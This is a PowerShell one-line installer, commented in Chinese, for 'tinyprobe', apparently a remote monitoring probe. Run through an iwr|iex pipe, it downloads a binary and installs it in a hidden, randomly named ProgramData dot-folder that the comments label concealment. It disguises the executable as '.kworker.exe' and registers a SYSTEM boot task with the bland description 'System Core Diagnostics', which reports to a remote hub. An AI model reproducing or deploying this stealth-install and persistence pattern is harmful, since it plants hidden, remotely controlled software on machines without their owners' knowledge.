# tinyprobe Windows 一键安装 / 自注册 / 自启动脚本
# 用法（PowerShell 管理员）:
#   $env:HUB="http://控制端IP:47821"; $env:NAME="web-01"; $env:TOKEN="secret";
#   $env:REPO="https://github.com/songyouxi/tinyprobe/releases/download"; $env:VERSION="v1.2.0";
#   iwr https://raw.githubusercontent.com/songyouxi/tinyprobe/main/install.ps1 | iex
#
# 一行版（irm | iex）：

$ErrorActionPreference = 'Stop'

$HUB      = if ($env:HUB)     { $env:HUB }     else { 'http://127.0.0.1:47821' }
$NAME     = if ($env:NAME)    { $env:NAME }    else { $env:COMPUTERNAME }
$TOKEN_B64= if ($env:TOKEN_B64){ $env:TOKEN_B64 } else { '' }
$TOKEN    = if ($env:TOKEN)   { $env:TOKEN }   else { '' }
if (-not $TOKEN -and $TOKEN_B64) {
  $TOKEN = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TOKEN_B64))
}
$REPO     = if ($env:REPO)    { $env:REPO }    else { 'https://github.com/songyouxi/tinyprobe/releases/download' }
$VERSION  = if ($env:VERSION) { $env:VERSION } else { 'v1.2.1' }
$SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'CoreDiagNode' }
$INTERVAL = if ($env:INTERVAL){ $env:INTERVAL }else { '2' }
# 隐蔽：ProgramData 下点号目录 + 随机后缀，二进制伪装为 .kworker.exe
$seed = 'corediag-' + ([guid]::NewGuid().ToString('N').Substring(0,12))
$INSTDIR  = if ($env:INSTALL_DIR) { $env:INSTALL_DIR } else { Join-Path $env:ProgramData ('.' + $seed) }
$BINNAME = '.kworker.exe'
$ENVNAME = '.conf'

function Detect-Arch {
  $a = $env:PROCESSOR_ARCHITECTURE
  switch ($a) {
    'AMD64' { return 'amd64' }
    'x86'   { return '386' }
    'ARM64' { return 'arm64' }
    default {
      # fallback via WMI
      try {
        $arch = (Get-CimInstance Win32_Processor | Select-Object -First 1).Architecture
        switch ($arch) { 9 { return 'amd64' } 0 { return '386' } 12 { return 'arm64' } }
      } catch {}
      return 'amd64'
    }
  }
}
$ARCH = Detect-Arch
Write-Host "== 架构: $env:PROCESSOR_ARCHITECTURE -> $ARCH"

$REPO = $REPO.TrimEnd('/')
$FILE = "probe-windows-$ARCH.exe"
if ($VERSION -eq 'latest') {
  $BIN_URL  = "$REPO/$FILE"
  $SUMS_URL = "$REPO/SHA256SUMS"
} else {
  $BIN_URL  = "$REPO/$VERSION/$FILE"
  $SUMS_URL = "$REPO/$VERSION/SHA256SUMS"
}
Write-Host "== 下载: $BIN_URL"

$tmp = Join-Path $env:TEMP "tinyprobe-$FILE"
$sums = Join-Path $env:TEMP 'tinyprobe-SHA256SUMS'
try {
  Invoke-WebRequest -Uri $BIN_URL -OutFile $tmp -UseBasicParsing -TimeoutSec 60
} catch {
  Write-Error "下载失败: $($_.Exception.Message)。请检查 REPO/VERSION/架构。"; exit 1
}

# 校验 SHA256（可选）
try {
  Invoke-WebRequest -Uri $SUMS_URL -OutFile $sums -UseBasicParsing -TimeoutSec 30
  $expect = ''
  foreach ($line in (Get-Content $sums)) {
    if ($line -like "* $FILE") { $expect = ($line -split '\s+')[0]; break }
  }
  if ($expect) {
    $actual = (Get-FileHash -Algorithm SHA256 $tmp).Hash.ToLower()
    if ($actual -ne $expect.ToLower()) { Write-Error "SHA256 校验失败"; exit 1 }
    Write-Host "== SHA256 校验通过: $actual"
  } else { Write-Host "== 清单无此架构条目，跳过校验" }
} catch { Write-Host "== 无 SHA256SUMS，跳过校验" }

# 安装到隐蔽目录
New-Item -ItemType Directory -Force -Path $INSTDIR | Out-Null
$BIN = Join-Path $INSTDIR $BINNAME
Copy-Item -Force $tmp $BIN
# root-only 风格 env 文件：token 不出现在计划任务参数里
$ENVFILE = Join-Path $INSTDIR $ENVNAME
$lines = @("# tinyprobe private env","TP_HUB=$HUB","TP_NAME=$NAME","TP_TOKEN=$TOKEN","TP_SERVICE=$SERVICE","TP_INTERVAL=$INTERVAL")
[System.IO.File]::WriteAllLines($ENVFILE, $lines)
Write-Host "== 已安装: $BIN"

# 注册计划任务（开机自启 + 立即启动），参数只有 envfile
$taskName = $SERVICE
$argStr = "-envfile `"$ENVFILE`""

$existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($existing) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }

$action = New-ScheduledTaskAction -Execute $BIN -Arguments $argStr
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description 'System Core Diagnostics' | Out-Null
Start-ScheduledTask -TaskName $taskName
Write-Host "== 计划任务已注册并启动: $taskName"

Start-Sleep -Seconds 2
Get-ScheduledTaskInfo -TaskName $taskName | Select-Object TaskName,LastRunTime,LastTaskResult | Format-List
Write-Host "== 完成。节点=$NAME 中心=$HUB 架构=$ARCH"
